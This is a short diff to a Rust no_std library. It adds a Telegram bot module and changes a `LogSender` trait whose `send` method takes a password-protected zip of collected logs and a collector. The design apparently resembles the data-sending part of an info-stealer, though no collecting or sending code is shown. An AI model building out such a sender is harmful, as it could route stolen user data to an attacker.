@@ -1,11 +1,13 @@
 #![no_std]
 
 extern crate alloc;
+pub mod telegram_bot;
 
 use alloc::string::String;
 use alloc::vec::Vec;
 use collector::Collector;
 
+#[derive(Debug)]
 pub enum SendError {
     Network,
     UnsupportedLogFile,
@@ -36,7 +38,8 @@ pub trait LogSender {
     /// # Returns
     ///
     /// - `Result<(), SendError>`: Returns `Ok(())` if the log was sent successfully, or a [`SendError`] if the operation failed.
-    fn send<C>(&self, zip_archive: LogFile, password: Option<String>, collector: C) -> Result<(), SendError>
+    fn send<P, C>(&self, zip_archive: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
     where
+        P: AsRef<str>,
         C: Collector;
 }
